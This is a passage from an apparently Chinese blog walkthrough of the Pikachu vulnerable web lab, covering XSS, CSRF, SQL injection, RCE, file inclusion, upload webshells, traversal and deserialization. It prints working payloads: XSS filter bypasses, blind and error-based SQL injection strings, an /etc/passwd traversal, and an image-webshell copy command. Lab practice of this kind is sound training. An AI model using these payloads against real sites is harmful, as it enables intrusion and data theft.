id="06-xss-盲打"><a href="#06-xss-盲打" class="headerlink" title="06.xss 盲打"></a>06.xss 盲打</h3><p><code>前台输入数据不会显示结果，只有登入到后台才会看到</code></p><img src="/2021/04/28/Pikachu/image-20210426130043847.png" class><p><code>每次刷新都会弹窗</code></p><img src="/2021/04/28/Pikachu/image-20210426130139582.png" class><h3 id="07-xss过滤"><a href="#07-xss过滤" class="headerlink" title="07.xss过滤"></a>07.xss过滤</h3><p><code>过滤了script，使用大小写绕过即可</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(<span class="regexp">/xss/</span>)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426131019115.png" class><h3 id="08-xss之htmlspecialchars"><a href="#08-xss之htmlspecialchars" class="headerlink" title="08.xss之htmlspecialchars"></a>08.xss之htmlspecialchars</h3><p><code>htmlspecialchars()函数将特殊字符转换为HTML实体</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;</span><br><span class="line">&quot; （双引号）成为 &quot;</span><br><span class="line">&#39; （单引号）成为 &#39;</span><br><span class="line">&lt; （小于）成为 &lt;</span><br><span class="line">&gt; （大于）成为 &gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&#x27;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426131739542.png" class><h3 id="09-xss之hre输出"><a href="#09-xss之hre输出" class="headerlink" title="09.xss之hre输出"></a>09.xss之hre输出</h3><p><code>点击触发代码</code></p><img src="/2021/04/28/Pikachu/image-20210426132151201.png" class><h3 id="10-xss之js输出"><a href="#10-xss之js输出" class="headerlink" title="10.xss之js输出"></a>10.xss之js输出</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">demo&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(/</span>xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426133309084.png" class><h2 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03.CSRF"></a>0x03.CSRF</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">CSRF(跨站请求伪造)概述</span><br><span class="line">Cross-site request forgery 简称为“CSRF”，</span><br><span class="line">在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），</span><br><span class="line">然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。</span><br><span class="line">所以CSRF攻击也成为&quot;one click&quot;攻击。 </span><br><span class="line">很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,</span><br><span class="line">更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</span><br><span class="line">这里列举一个场景解释一下，希望能够帮助你理解。</span><br><span class="line">场景需求：</span><br><span class="line">小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。</span><br><span class="line">先看下大白是如何修改自己的密码的：</span><br><span class="line">登录---修改会员信息，提交请求---修改成功。</span><br><span class="line">所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</span><br><span class="line">但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？</span><br><span class="line">于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</span><br><span class="line">【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</span><br><span class="line">于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。</span><br><span class="line">为啥小黑的操作能够实现呢。有如下几个关键点：</span><br><span class="line">1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;</span><br><span class="line">---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。</span><br><span class="line">2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;</span><br><span class="line">---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。</span><br><span class="line">---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。</span><br><span class="line">当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。</span><br><span class="line">---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</span><br><span class="line">因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：</span><br><span class="line">--对敏感信息的操作增加安全的token；</span><br><span class="line">--对敏感信息的操作增加安全的验证码；</span><br><span class="line">--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</span><br></pre></td></tr></table></figure><h3 id="01-CSRF-get"><a href="#01-CSRF-get" class="headerlink" title="01.CSRF(get)"></a>01.CSRF(get)</h3><p><code>lili登入，get传参</code></p><img src="/2021/04/28/Pikachu/image-20210426134446159.png" class><p><code>伪造连接让kobe点击</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://81.70.195.159:8001/vul/csrf/csrfget/csrf_get_edit.php?sex=demo&amp;phonenum=110&amp;add=demo&amp;email=demo%40qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426134739431.png" class><h3 id="02-CSRF-post"><a href="#02-CSRF-post" class="headerlink" title="02.CSRF(post)"></a>02.CSRF(post)</h3><p><code>这回用kobe欺骗lili</code></p><img src="/2021/04/28/Pikachu/image-20210426135921623.png" class><p><code>生成POC，让lili点</code></p><img src="/2021/04/28/Pikachu/image-20210426140028390.png" class><p><code>lili登入，lili点击</code></p><img src="/2021/04/28/Pikachu/image-20210426140224883.png" class><p><code>修改成功</code></p><img src="/2021/04/28/Pikachu/image-20210426140321498.png" class><h3 id="03-CSRF-token"><a href="#03-CSRF-token" class="headerlink" title="03.CSRF token"></a>03.CSRF token</h3><p><code>查看源码</code></p><h2 id="0x04-Sql-Inject"><a href="#0x04-Sql-Inject" class="headerlink" title="0x04.Sql Inject"></a>0x04.Sql Inject</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</span><br><span class="line">    </span><br><span class="line">一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</span><br><span class="line">SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，</span><br><span class="line">导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 </span><br><span class="line">从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</span><br><span class="line">在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：</span><br><span class="line">1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</span><br><span class="line">2.使用参数化（Parameterized Query 或 Parameterized Statement）；</span><br><span class="line">3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了&quot;拼接&quot;的方式,所以使用时需要慎重!</span><br></pre></td></tr></table></figure><h3 id="01-数字型注入-post"><a href="#01-数字型注入-post" class="headerlink" title="01.数字型注入(post)"></a>01.数字型注入(post)</h3><p><code>一共两个字段，爆表爆字段不在赘述</code></p><img src="/2021/04/28/Pikachu/image-20210427091648529.png" class><h3 id="02-字符型注入-get"><a href="#02-字符型注入-get" class="headerlink" title="02.字符型注入(get)"></a>02.字符型注入(get)</h3><p><code>闭合单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/vul/sqli/sqli_str.php?name=admin&#x27; or &#x27;1&#x27;=&#x27;1&amp;submit=查询</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427092111715.png" class><h3 id="03-搜索型注入"><a href="#03-搜索型注入" class="headerlink" title="03.搜索型注入"></a>03.搜索型注入</h3><p><code>直接输入%%即可，%%表示查询列有不为null的全部值</code></p><img src="/2021/04/28/Pikachu/image-20210427092429147.png" class><h3 id="04-xx型注入"><a href="#04-xx型注入" class="headerlink" title="04.xx型注入"></a>04.xx型注入</h3><p><code>闭合字符为&#39;) 同第一题</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/vul/sqli/sqli_str.php?name=admin&#x27;) or 1=1 -- -&amp;submit=查询</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427092840466.png" class><h3 id="05-insert-update注入"><a href="#05-insert-update注入" class="headerlink" title="05.insert/update注入"></a>05.insert/update注入</h3><p><code>注册点存在注入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admon&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427102044309.png" class><h3 id="06-delete注入"><a href="#06-delete注入" class="headerlink" title="06.delete注入"></a>06.delete注入</h3><p><code>同上</code></p><img src="/2021/04/28/Pikachu/image-20210427103706046.png" class><h3 id="07-http-header-注入"><a href="#07-http-header-注入" class="headerlink" title="07.http header 注入"></a>07.http header 注入</h3><p><code>注入点为user-agent/cookie</code></p><img src="/2021/04/28/Pikachu/image-20210427105308987.png" class><h3 id="08-盲注-base-boolian"><a href="#08-盲注-base-boolian" class="headerlink" title="08.盲注(base boolian)"></a>08.盲注(base boolian)</h3><p><code>逐字爆破数据库第一个字母为p</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427111803637.png" class><h3 id="09-盲注-base-time"><a href="#09-盲注-base-time" class="headerlink" title="09.盲注(base time)"></a>09.盲注(base time)</h3><p><code>输入什么都只有一个回显</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())=7,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427112355990.png" class><h3 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10.宽字节注入"></a>10.宽字节注入</h3><blockquote><p>payload</p><p>kobe%e0’ or 1=1 – -</p></blockquote><img src="/2021/04/28/Pikachu/image-20210427151329767.png" class><h2 id="0x05-RCE"><a href="#0x05-RCE" class="headerlink" title="0x05.RCE"></a>0x05.RCE</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">RCE(remote command/code execute)概述RCE漏洞，</span><br><span class="line">可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，</span><br><span class="line">从而控制后台系统。远程系统命令执行一般出现这种漏洞，</span><br><span class="line">是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，</span><br><span class="line">用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 </span><br><span class="line">而，如果，设计者在完成该功能时，没有做严格的安全控制，</span><br><span class="line">则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，</span><br><span class="line">从而控制整个后台服务器现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过&quot;自动化运维平台&quot;进行操作。 </span><br><span class="line">在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,</span><br><span class="line">会有意想不到的&quot;收获&quot;-_-远程代码执行同样的道理,因为需求设计,</span><br><span class="line">后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 </span><br><span class="line">不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</span><br><span class="line">因此，如果需要给前端用户提供操作类的API接口，</span><br><span class="line">一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</span><br></pre></td></tr></table></figure><h3 id="01-exec-ping"><a href="#01-exec-ping" class="headerlink" title="01.exec(ping)"></a>01.exec(ping)</h3><p><code>简单的命令执行</code></p><img src="/2021/04/28/Pikachu/image-20210427152244048.png" class><h2 id="02-exec-eval"><a href="#02-exec-eval" class="headerlink" title="02.exec(eval)"></a>02.exec(eval)</h2><p><code>响应php代码</code></p><img src="/2021/04/28/Pikachu/image-20210427152552241.png" class><h2 id="0x06-文件包含"><a href="#0x06-文件包含" class="headerlink" title="0x06.文件包含"></a>0x06.文件包含</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">File Inclusion(文件包含漏洞)概述文件包含，是一个功能。</span><br><span class="line">在各种开发语言中都提供了内置的文件包含函数，</span><br><span class="line">其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 </span><br><span class="line">比如 在PHP中，提供了：include(),include_once()require(),require_once()这些文件包含函数，</span><br><span class="line">这些函数在代码设计中被经常使用到。</span><br><span class="line">大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 </span><br><span class="line">但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，</span><br><span class="line">这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 </span><br><span class="line">攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 </span><br><span class="line">根据不同的配置环境，</span><br><span class="line">文件包含漏洞分为如下两种情况：</span><br><span class="line">1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，</span><br><span class="line">由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，</span><br><span class="line">攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。</span><br><span class="line">很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</span><br><span class="line">2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，</span><br><span class="line">这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</span><br><span class="line">因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，</span><br><span class="line">如果非要这么做，也一定要做严格的白名单策略进行过滤。</span><br></pre></td></tr></table></figure><h3 id="01-本地文件包含"><a href="#01-本地文件包含" class="headerlink" title="01.本地文件包含"></a>01.本地文件包含</h3><img src="/2021/04/28/Pikachu/image-20210427153823309.png" class><h3 id="02-远程文件包含"><a href="#02-远程文件包含" class="headerlink" title="02.远程文件包含"></a>02.远程文件包含</h3><p><code>nothing</code></p><h2 id="0x07-不安全的文件下载"><a href="#0x07-不安全的文件下载" class="headerlink" title="0x07.不安全的文件下载"></a>0x07.不安全的文件下载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不安全的文件下载概述文件下载功能在很多web系统上都会出现，</span><br><span class="line">一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，</span><br><span class="line">后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 </span><br><span class="line">如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，</span><br><span class="line">则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，</span><br><span class="line">而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 </span><br><span class="line">从而导致后台敏感信息(密码文件、源代码等)被下载。所以，在设计文件下载功能时，</span><br><span class="line">如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 </span><br><span class="line">切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427170920823.png" class><h2 id="0x08-不安全的文件上传"><a href="#0x08-不安全的文件上传" class="headerlink" title="0x08.不安全的文件上传"></a>0x08.不安全的文件上传</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不安全的文件上传漏洞概述文件上传功能在web应用系统很常见，</span><br><span class="line">比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，</span><br><span class="line">后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，</span><br><span class="line">然后将其按照设计的格式进行重命名后存储在指定的目录。 </span><br><span class="line">如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，</span><br><span class="line">则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。</span><br><span class="line">所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。</span><br><span class="line">比如：--验证文件类型、后缀名、大小;--验证文件的上传方式;</span><br><span class="line">--对文件进行一定复杂的重命名;--不要暴露文件上传后的路径;--等等...</span><br></pre></td></tr></table></figure><h3 id="01-client-check"><a href="#01-client-check" class="headerlink" title="01.client check"></a>01.client check</h3><p><code>抓包改名即可</code></p><img src="/2021/04/28/Pikachu/image-20210427172209197.png" class><p><code>蚁剑连接</code></p><img src="/2021/04/28/Pikachu/image-20210427172237838.png" class><h3 id="02-MIME-type"><a href="#02-MIME-type" class="headerlink" title="02.MIME type"></a>02.MIME type</h3><p><code>抓包修改文件类型即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">常见的MIME类型超文本标记语言文本</span><br><span class="line">.html,.html text/html普通文本 </span><br><span class="line">.txt text/plainRTF文本 </span><br><span class="line">.rtf application/rtfGIF图形 </span><br><span class="line">.gif image/gifJPEG图形 </span><br><span class="line">.ipeg,.jpg image/jpegau声音文件 </span><br><span class="line">.au audio/basicMIDI音乐文件 </span><br><span class="line">.mid,.midi audio/midi,audio/x-midiRealAudio音乐文件 </span><br><span class="line">.ra, .ram audio/x-pn-realaudioMPEG文件 </span><br><span class="line">.mpg,.mpeg video/mpegAVI文件 </span><br><span class="line">.avi video/x-msvideoGZIP文件 </span><br><span class="line">.gz application/x-gzipTAR文件 </span><br><span class="line">.tar application/x-tar</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427172741958.png" class><h3 id="03-getimagesize"><a href="#03-getimagesize" class="headerlink" title="03.getimagesize"></a>03.getimagesize</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个函数功能会对目标文件的16进制去进行一个读取，</span><br><span class="line">去读取头几个字符串是不是符合图片的要求的,</span><br><span class="line">所以不能通过修改content-type来达到目的，</span><br><span class="line">需要将一句话放入一张真正的图片    copy shell.jpg/b + shell.php/b shell.jpg</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427205034653.png" class><p><code>包含这个图片马，再用蚁剑连接</code></p><h2 id="0x09-越权"><a href="#0x09-越权" class="headerlink" title="0x09.越权"></a>0x09.越权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，</span><br><span class="line">如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。</span><br><span class="line">一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，</span><br><span class="line">当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，</span><br><span class="line">看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</span><br><span class="line">因此，在在权限管理中应该遵守：</span><br><span class="line">1.使用最小权限原则对用户进行赋权;</span><br><span class="line">2.使用合理（严格）的权限校验规则;</span><br><span class="line">3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件。</span><br></pre></td></tr></table></figure><h3 id="01-水平越权"><a href="#01-水平越权" class="headerlink" title="01.水平越权"></a>01.水平越权</h3><p><code>修改username值可以发现可以查看任意用户信息</code></p><h3 id="02-垂直越权"><a href="#02-垂直越权" class="headerlink" title="02.垂直越权"></a>02.垂直越权</h3><p><code>使用pikachu登入访问vul/overpermission/op2/op2_admin_edit.php</code></p><img src="/2021/04/28/Pikachu/image-20210427212129726.png" class><h2 id="0x10-目录遍历"><a href="#0x10-目录遍历" class="headerlink" title="0x10.目录遍历"></a>0x10.目录遍历</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">目录遍历漏洞概述</span><br><span class="line">在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，</span><br><span class="line">从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，</span><br><span class="line">便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 </span><br><span class="line">在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，</span><br><span class="line">则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 </span><br><span class="line">从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</span><br><span class="line">看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，</span><br><span class="line">甚至文件包含漏洞有差不多的意思，</span><br><span class="line">是的，目录遍历漏洞形成的最主要的原因跟这两者一样，</span><br><span class="line">都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，</span><br><span class="line">而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，</span><br><span class="line">因此，这里还是单独拿出来定义一下。</span><br><span class="line">需要区分一下的是,</span><br><span class="line">如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，</span><br><span class="line">这种情况，我们成为敏感信息泄露。 </span><br><span class="line">而并不归为目录遍历漏洞。</span><br></pre></td></tr></table></figure><blockquote><p>?title=../../../../../../../etc/passwd</p></blockquote><img src="/2021/04/28/Pikachu/image-20210427212801523.png" class><h2 id="0x11-敏感信息泄露"><a href="#0x11-敏感信息泄露" class="headerlink" title="0x11.敏感信息泄露"></a>0x11.敏感信息泄露</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">敏感信息泄露概述</span><br><span class="line">由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 </span><br><span class="line">比如：</span><br><span class="line">---通过访问url下的目录，可以直接列出目录下的文件列表;</span><br><span class="line">---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;</span><br><span class="line">---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</span><br><span class="line">类似以上这些情况，我们成为敏感信息泄露。</span><br><span class="line">敏感信息泄露虽然一直被评为危害比较低的漏洞，</span><br><span class="line">但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,</span><br><span class="line">甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 </span><br><span class="line">因此,在web应用的开发上，除了要进行安全的代码编写，</span><br><span class="line">也需要注意对敏感信息的合理处理。</span><br></pre></td></tr></table></figure><p><code>查看源码发现用户 lili/123456</code></p><h2 id="0x12-PHP反序列化"><a href="#0x12-PHP反序列化" class="headerlink" title="0x12.PHP反序列化"></a>0x12.PHP反序列化</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。</span><br><span class="line"></span><br><span class="line">序列化serialize()</span><br><span class="line">序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    serialize($s); //把这个对象进行序列化</span><br><span class="line">    序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">        O:代表object</span><br><span class="line">        1:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        1:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        4:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        7:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br><span class="line">    </span><br><span class="line">反序列化unserialize()</span><br><span class="line">就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</span><br><span class="line"></span><br><span class="line">    